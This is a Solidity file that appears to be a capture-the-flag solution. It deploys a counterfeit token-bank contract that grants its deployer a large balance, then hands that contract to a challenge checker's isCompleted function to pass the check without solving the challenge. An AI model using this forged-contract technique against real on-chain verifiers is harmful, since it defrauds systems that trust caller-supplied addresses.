/*
部署一个这个合约即可
*/
import "./tokenbank.sol";
contract tokenbank2{
    address public owner;
    mapping(address => uint256)private balance;
    constructor(address _owner){
        owner = _owner;
        balance[msg.sender]+=10000 ether;
    }

    modifier onlyOwner{
        require(msg.sender==owner,"onlyowner");

        _;
    }

    function deposit()public payable{
        require(msg.value>0,"are you kidding me?");
        balance[msg.sender]+=msg.value;
    }

    function withdraw(uint256 amount)public payable{
        require(balance[msg.sender]>=amount);
        balance[msg.sender]-=amount;
        payable(msg.sender).transfer(amount);
    }

    function transfer(address _addr,uint256 amount)public{
        require(balance[msg.sender]>=amount);
        require(msg.sender!=_addr);
        balance[msg.sender]-=amount;
        balance[_addr]+=amount;
    }
    function balanceOf(address _addr)public view returns(uint256){
        return balance[_addr];
    }

    function mint(address _addr,uint256 amount)public onlyOwner{
        balance[_addr]+=amount;
    }

    function burn(address _addr,uint256 amount)public onlyOwner{
        balance[_addr]-=amount;
    }

    function transferOwnership(address _addr)public onlyOwner{
        owner = _addr;
    }

}
contract attck{
    check to;
    tokenbank2 to2 ;
    constructor(address _tokenbank)public{
        to = check(_tokenbank);
        to2 = new tokenbank2(_tokenbank);
    }

    function complete()public{
        to.isCompleted(address(to2));
    }
}